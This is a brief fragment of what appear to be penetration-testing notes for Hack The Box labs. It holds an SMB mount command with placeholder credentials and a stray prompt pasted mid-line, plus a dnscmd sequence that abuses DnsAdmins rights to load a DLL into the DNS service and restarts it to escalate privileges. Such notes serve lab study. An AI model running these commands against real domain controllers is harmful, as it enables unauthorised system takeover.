...
intrusionz3r0@kali:~$ mount -t cifs //x.x.x.x/RECURSO intrusionz3r0@kali:~$ /mnt/HTB/FOLDER -o username=USER,password=PASS,rw
```
...
PS c:\> dnscmd RESOLUTE.LOCAL /config /serverlevelplugindll \\PATH
PS c:\> sc stop dns
PS c:\> sc start dns
```
#### AD Recycle Bin
